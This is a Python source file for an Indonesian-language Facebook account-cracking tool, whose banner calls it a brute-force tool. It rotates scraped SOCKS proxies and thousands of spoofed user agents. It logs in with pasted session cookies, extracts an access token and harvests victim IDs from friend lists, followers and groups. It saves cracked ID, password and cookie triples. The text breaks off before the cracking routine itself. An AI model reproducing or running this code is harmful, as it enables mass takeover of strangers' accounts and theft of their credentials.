#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series UA-API SESEPUH/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)

###++++++ [ USER AGENT SESEPUH ] +++++++###

#	aa='Mozilla/5.0 (Maemo; Linux; Jolla; Sailfish; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) NokiaBrowser/'
#	b=random.randrange(0,9)
#	c=random.randrange(0,9)
#	d=random.randrange(0,9)
#	e='Mobile Safari/537.36'
#	uaku2=f'{aa}{b}.{c}.{d} {e}'
#	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.randrange(5, 12)
	c='ZT216_'
	d=random.randrange(1, 9)
	e='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	f=random.randrange(73,100)
	g='0'
	h=random.randrange(4200,4900)
	i=random.randrange(40,150)
	j='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}) {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','5.1','5.1.1','6.0','6.0.1','7.0','7.0.0','7.1.2','8.1','8.1.0','8.0.0','9','10','11','12'])
	c='VERYKOOL ROCKET'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.randrange(0, 9)
	g=random.randrange(0, 9)
	h=random.randrange(0, 9)
	i=random.randrange(0, 9)
	j='Build/'
	k=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	l=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	m=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	n=random.randrange(0, 9)
	o=random.randrange(0, 9)
	p=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	q='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	r=random.randrange(73,100)
	s='0'
	t=random.randrange(4200,4900)
	u=random.randrange(40,150)
	v='Mobile Safari/21.3.4.59'
	uaku2=f'{aa} {b}; {c} {d}{e}{f}{g}{h}{i} {j}{k}{l}{m}{n}{o}{p}) {q}{r}.{s}.{t}.{u} {v}'
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','5.1','5.1.1','6.0','6.0.1','7.0','7.0.0','7.1.2','8.1','8.1.0','8.0.0','9','10','11','12'])
	c='VERYKOOL ROCKET'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.randrange(0, 9)
	g=random.randrange(0, 9)
	h=random.randrange(0, 9)
	i=random.randrange(0, 9)
	j='Build/'
	k=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	l=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	m=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	n=random.randrange(0, 9)
	o=random.randrange(0, 9)
	p=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	q='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	r=random.randrange(73,100)
	s='0'
	t=random.randrange(4200,4900)
	u=random.randrange(40,150)
	v='Mobile Safari/21.3.4.59'
	uaku2=f'{aa} {b}; {c} {d}{e}{f}{g}{h}{i} {j}{k}{l}{m}{n}{o}{p} {q}{r}.{s}.{t}.{u} {v}'
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.randrange(5, 12)
	c='RMX'
	d=random.randrange(1000, 4900)
	e='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	f=random.randrange(15,100)
	g='0'
	h=random.randrange(4200,4900)
	i=random.randrange(40,150)
	j='Mobile Safari/537.36'
	k='OPR/'
	l=random.randrange(10,100)
	m='0'
	n=random.randrange(1000,9999)
	o=random.randrange(10000,99999)
	uaku2=f'{aa} {b}; {c}{d}) {e}{f}.{g}.{h}.{i} {j} {k}{l}.{m}.{n}.{o}'
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['4.2.2','5.0','5.1','5.1.1','6.0','6.0.1','7.0','7.1.2','8.0','8.1','8.0.0','8.1.0','9','10','11','12'])
	c=random.choice(['ELE-L29','VOG-L29','CLT-L29','EML-L29','LYA-AL00','EVR-L29','BLA-L29',])
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(73,100)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}) {d}{e}.{f}.{g}.{h} {i}'
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.randrange(5, 12)
	c='RMX'
	d=random.randrange(1000, 4900)
	e='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	f=random.randrange(15,100)
	g='0'
	h=random.randrange(4200,4900)
	i=random.randrange(40,150)
	j='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}) {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.randrange(4, 12)
	c='RMX'
	d=random.randrange(1000, 9999)
	e='Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(73, 100)
	g='0'
	h=random.randrange(1800, 5900)
	i=random.randrange(40, 150)
	j='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d} {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(uaku2)

	#user agent custom punya sesepuh#
	rc = random.choice
	rr = random.randrange
	az = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	version_android = ['4.2.2','5.0','5.1','5.0.1','5.1.1','6.0','6.0.1','7.0','7.1.2','8.1','8.0.0','8.1.0','9','10','11','12']
	acak_device = ['M7S_LITE Build/V20_20220110; wv','fa-ir; Amazon Kindle Fire2 Build/JDQ39E','MI 5C Build/N2G47J; wv','RMX2111 Build/RP1A.200720.011; wv','CPH2373 Build/RKQ1.211119.001; wv','VERYKOOL ROCKET SL5565 Build/NRD90R','Infinix X5515F Build/O11019','de; POCO M3 Pro 5G Build/RP1A.200720.011','es-mx; ZTE 8045 Build/RP1A.201005.001; wv','SAMSUNG SM-A505F Build/PPR1.180610.011','RMX3661 Build/RKQ1.211119.001; wv','de; POCO M3 Pro 5G Build/RP1A.200720.011','RMX3430 Build/SP1A.210812.016; wv','Lenovo A536 Build/KOT49H; wv','M2012K11C Build/D','Redmi Note 10 Pro','Infinix X662 Build/RP1A.200720.011; wv','vivo 1820 Build/O11019; wv','Redmi Note 4X Build/MiUI MS; wv','RMX1911 Build/PKQ1.190616.001','th-th; RMX1911 Build/QKQ1.200209.002','RMX3511 Build/RP1A.201005.001; wv','T-I9500 Build/LRX22C; wv','GT-I9500 Build/LRX22C','vivo Y91c','RMX3430 Build/RP1A.200720.011; wv','SM-J120F Build/LMY47X; wv','Lenovo L38041','en-us; Nexus 5 Build/JOP40D','TECNO CX Air Build/NRD90M']
	a=f"Mozilla/5.0 (Linux; Android {str(rc(version_android))}; {str(rc(acak_device))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,110))}.0.{str(rr(1800,5900))}.{str(rr(40,150))} Mobile Safari/537.36"
	b=f"Mozilla/5.0 (Linux; Android {str(rr(5,12))}; {str(rc(acak_device))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,110))}.0.{str(rr(4200,4900))}.{str(rr(40,150))} Mobile Safari/537.36"
	uaku2=str(rc([a,b]))
	ugen.append(uaku2)
	
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('Mozilla/5.0 (Linux; U; Android 2.$v; fr-fr; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('Mozilla/5.0 (Linux; U; Android 2.$v; fr-fr; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1').text
		ua=open('Mozilla/5.0 (Linux; U; Android 2.$v; fr-fr; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('Mozilla/5.0 (Linux; U; Android 2.$v; fr-fr; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	clear()
	sol()
	ban=''' SESEPUH Brute force Facebook account

______________________A̵͎̪̓̽͋͜Ǹ̵̡̞̓̓O̴͎͚̔͒͘͜N̴͇͇͕͛́̽Y̸̪͕͍̽͌͘M̸͍̪͓̽̀O̸̢͍͑̓͘͜U̴̺͊̾͘͜S̴̠̀̈́͋͜͜_______________________

 ██████╗███████╗ ██████╗███████╗██████╗ ██╗   ██╗██╗  ██╗
██╔════╝██╔════╝██╔════╝██╔════╝██╔══██╗██║   ██║██║  ██║
╚█████╗ █████╗  ╚█████╗ █████╗  ██████╔╝██║   ██║███████║
 ╚═══██╗██╔══╝   ╚═══██╗██╔══╝  ██╔═══╝ ██║   ██║██╔══██║
██████╔╝███████╗██████╔╝███████╗██║     ╚██████╔╝██║  ██║
╚═════╝ ╚══════╝╚═════╝ ╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝

________________________S͛EͤS͛EͤРⷬUͧнⷩ_________________________ '''
	cetak(nel(ban, style='yellow'))
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='purple')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t             MAU MALING YA : [green]BANTAI SI MARK AJING[purple] '))
		ses = requests.Session()
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}•{u}] Masukkan Cookies Njing :{asu} ')
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		nik = re.search("(EAAG\w+)",str(roq.content)).group(1)
		tokenw = open(".token.txt", "w").write(tok)
		cokiew = open(".cok.txt", "w").write(cookie)
		print(f' {u}[{h}•{u}]{h} LOGIN BERHASIL.........Jalankan Lagi Perintahnya!!!!{k} ');time.sleep(1)
		os.system('python ijo.py')
		#bot()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
		exit()
		
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	cetak(nel('\tSelamat Datang [green]%s[purple] SEMOGA DILANCARKAN MALINGNYA'%(my_name)))
	alvino_xy(f'{u}ID     : '+str(my_id))
	alvino_xy(f'{h}IP     : {ip}')
	print 	     ("\x1b[1;91m"'STATUS : PRIVATE')
	cetak(nel('\t[bold cyan]           • PILIH PENGEN MALING MODE YANG MANA • [/bold cyan]'))
	print('')
	cetak(nel('[bold green] 🇮🇩1. Crack Publik\n 🇮🇩2. Crack Follower\n 🇮🇩3. Crack Grup\n 🇮🇩4. Crack File\n 🇮🇩5. Hasil Crack\n 🇮🇩0. Keluar [bold green]')) 
	_____cowok__pink_____ = input('\n➥➥➣Pilih : ')
	if _____cowok__pink_____ in ['1']:
		dump_massal()
	elif _____cowok__pink_____ in ['2']:
		dump_follower()
	elif _____cowok__pink_____ in ['3']:
		error()
	elif _____cowok__pink_____ in ['4']:
		crack_file()
	elif _____cowok__pink_____ in ['5']:
		result()
	elif _____cowok__pink_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('➥➥➣Sukses Logout+Hapus Kukis ')
		exit()
	else:
		print('➥➥➣Pilih Yang Bener Asu ')
		back()
def error():
	print(f'{k}➥➥➣Maaf Fitur Ini Masih Di Perbaiki {u}')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print('➥➥➣Hasil OK Anda ')
	print('➥➥➣Hasil CP Anda ')
	print('➥➥➣Kembali	')
	kz = input('\n➥➥➣Pilih : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('➥➥➣File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('➥➥➣Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
			geeh = input('\n➥➥➣Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('➥➥➣Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('➥➥➣File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('➥➥➣File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('➥➥➣Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
			geeh = input('\n➥➥➣Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('➥➥➣Pilih Yang Bener TOLOL ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('➥➥➣File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}COOKIE : {u}{cpkuni[2]}')
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['0','00']:
		back()
	else:
		print('➥➥➣Pilih Yang Bener TOLOL ')
		exit()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('➥➥➣BERAPA TARGET  ? : '))
	except ValueError:
		print('{k}➥➥➣SALAH KETIK KAU GOBLOK ')
		exit()
	if jum<1 or jum>100:
		print('➥➥➣Gagal Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('➥➥➣INPUT ID KE '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('{k}➥➥➣Sinyal Loh Kek Kontoll ')
			exit()
	try:
		print('')
		print(f'{k}➥➥➣Total Id Yang Terkumpul★{b}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		print('➥➥➣Sinyal Lo kek Kontol ')
		back()
	except (KeyError,IOError):
		print(f'➥➥➥➣{k} Pertemanan Tidak Public {u}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	print('➥➥➣Ketik ( me ) Jika Ingin Crack Follower Sendiri ')
	pil = input('➥➣Masukkan Idz Target : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(f'➥➥➣Total Idz :{h} '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print('➥➥➣Koneksi Internet Bermasalah ')
		exit()
	except (KeyError,IOError):
		print('➥➥➣Gagal Mengambil Target ')
		exit()
#------------------[ CRACK-GRUP ]-----------------#
balmond = b+"["+h+"✓"+b+"]"

def lah():
	print("\r"+balmond+m+" \x1b[1;95mTotal ID Yang Terkumpul :\x1b[1;97m "+str(len(id))+"                     ")
	input(balmond+m +"\x1b[1;97m Klik [\x1b[1;96m Enter ]\x1b[1;97m Jika Ingin Langsung Crack !!")
	pass
	setting()
def grup():
	print('')
	id = input(""+balmond+h+" \x1b[1;94m>> Masukkan Idz Grup :\x1b[1;94m ")
	ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
	miskinlu = {"user-agent": ua}
	url = "https://mbasic.facebook.com/groups/"+id
	ses = requests.Session()
	try:
		gn = parser(ses.get(url, headers=miskinlu).text, 'html.parser')
	except requests.exceptions.ConnectionError:
		print(balmond+m+" Koneksi Internet Terputus..")
		time.sleep(0.5)
		exit()
	berr = gn.find("title")
	berr2 = berr.text.replace(" | Facebook","").replace(" Grup Publik","")
	if berr2=='Masuk Facebook':
		print(balmond+m+" Limit, Silahkan Mode Pesawat Dan Coba Lagi..")
		time.sleep(0.5)
		crack_grup()
	elif berr2=='Kesalahan':
		jalan(balmond+m+" Grup Tidak Ditemukan..")
		time.sleep(0.5)
		crack_grup()
	else:pass
	print(""+balmond+p+" \x1b[1;94m>> Nama Grup :\x1b[1;97m "+berr2)
	ggs = gn.find_all('table')
	ang = []
	for ff in ggs:
		anggo = ff.text
		bro = anggo.replace('Anggota','')
		try:
			mex = int(bro)
			jumlah = ang.append(mex)
		except:
			pass
	if len(ang)==0:
		print(balmond+h+" Anggota : -")
	else:
		print(balmond+h+" \x1b[1;94m>> Anggota :\x1b[1;97m "+str(ang[0]))
	grup1(url)
def grup1(urls):
	use = []
	ses = requests.Session()
	print(""+balmond+m+" \x1b[1;94mJika Berhenti, Mode Pesawat 5 Detik")
	print(balmond+m+" \x1b[1;94mSedang Mengumpulkan ID")
	print(balmond+m+" \x1b[1;94mTekan CTRL + C Untuk Stop")
	while True:
		try:
			ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
			miskinlu = {"user-agent": ua}
			try:
				url = use[0]
			except:
				url = urls
			set = parser(ses.get(url, headers=miskinlu).text, "html.parser")
			bf2 = set.find_all('a')
			for g in bf2:
				css = str(g).split('>')
				if 'Lihat Postingan Lainnya</span' in css:
					bcj = str(g).replace('<a href="','').replace('amp;','')
					bcj2 = bcj.split(' ')[0].replace('"><img','')
			tes = set.find_all('table')
			for cari in tes:
				liatnih = cari.text
				spl = liatnih.split(' ')
				if 'mengajukan' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.replace(' mengajukan pertanyaan .','')
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						print(("\r"+balmond+h+" { "+k+"Proses Mengambil ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				elif '>' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.split(' > ')[0]
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						print(("\r"+balmond+h+" { "+O+"Mengumpulkan ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				else:
					continue
			try:
				link_ = bcj2
				use.insert(0,'https://mbasic.facebook.com'+link_)
			except:
				girang = set.find('title')
				girang2 = girang.text.replace(" | Facebook","").replace(" Grup Publik","")
				if girang2=='Masuk Facebook':
					pass
				else:
					lah()
		except requests.exceptions.ConnectionError:
			try:
				time.sleep(31)
			except KeyboardInterrupt:
				lah()
		except KeyboardInterrupt:
			lah()
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('DUMP')
	except FileNotFoundError:
		print('➥➥➣File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('➥➥➣Kamu Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'➥➥➣%s. %s ({h} %s{u} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
